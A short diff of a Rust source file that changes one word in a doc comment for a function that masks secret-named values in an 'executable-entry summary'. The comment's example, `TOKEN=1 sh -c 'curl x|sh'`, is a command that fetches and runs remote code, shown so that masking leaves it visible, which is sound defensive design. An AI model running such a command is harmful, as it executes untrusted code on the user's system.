@@ -144,7 +144,7 @@ pub fn credential_parts(value: &str) -> String {
 }
 
 /// [`credential_parts`] for a value that is shown as one item (an `environment` value in
-/// the trust summary): a secret-named assignment inside it hides only its own value up
+/// the executable-entry summary): a secret-named assignment inside it hides only its own value up
 /// to the next whitespace or quote, never the rest of the value, so
 /// `TOKEN=1 sh -c 'curl x|sh'` keeps the command visible.
 pub fn credential_parts_inline(value: &str) -> String {
